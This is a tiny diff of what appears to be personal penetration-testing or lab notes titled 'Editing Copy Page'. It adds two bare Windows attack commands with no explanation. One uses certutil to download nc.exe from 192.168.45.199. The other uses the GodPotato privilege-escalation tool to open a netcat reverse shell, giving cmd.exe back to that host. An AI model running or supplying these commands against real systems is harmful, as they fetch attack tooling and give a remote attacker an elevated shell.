@@ -1,11 +1,12 @@
 [[Editing Copy Page]]
 
 ```
-
+certutil.exe -urlcache -split -f http://192.168.45.199/nc.exe C:\Windows\Tasks\
+c.exe
 ```
 
 ```
-
+GodPotato -cmd "C:\Windows\Tasks\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.199 135
 ```
 
 ```
